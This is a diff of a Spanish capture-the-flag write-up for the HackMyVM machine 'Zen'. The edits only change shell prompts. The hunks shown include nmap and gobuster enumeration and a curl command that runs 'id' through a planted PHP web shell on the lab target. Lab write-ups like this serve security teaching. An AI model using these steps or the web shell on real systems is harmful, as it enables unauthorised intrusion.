@@ -1,3 +1,4 @@
+
 # Writeup: Máquina Zen - HackMyVM
 
 En este writeup rootearemos la máquina **Zen** de la plataforma HackMyVM. El acceso inicial será sencillo a través de una contraseña débil oculta en el `robots.txt`, mientras que la escalada de privilegios constará de una cadena de tres pivoteos laterales mediante sudo mal configurado y un secuestro del PATH para alcanzar root.
@@ -7,7 +8,7 @@ En este writeup rootearemos la máquina **Zen** de la plataforma HackMyVM. El ac
 Vamos con `nmap` para descubrir puertos abiertos con servicios expuestos:
 
 ```bash
-root@kali:~/hmv/Zen/nmap# nmap -p- --open -sSCV -n -Pn 192.168.0.30 -oN tcpScan
+$> nmap -p- --open -sSCV -n -Pn 192.168.0.30 -oN tcpScan
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -35,7 +36,7 @@ El hecho de que `/P@ssw0rd` devuelva 404 en lugar de un 403 es bastante raro, la
 Antes de nada vamos a completar la enumeración, fuzzeamos el directorio `/zp-core/`:
 
 ```bash
-root@kali:~/hmv/Zen/nmap# gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.30/zp-core/ -x txt,php -r
+$> gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.30/zp-core/ -x txt,php -r
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
@@ -63,7 +64,7 @@ Estamos autenticados y, como hemos dicho antes, sabemos que existen vulnerabilid
 Verificamos el RCE desde nuestra máquina:
 
 ```bash
-root@kali:~/hmv/Zen/content# curl -s http://192.168.0.30/themes/shell.php?cmd=id
+$> curl -s http://192.168.0.30/themes/shell.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
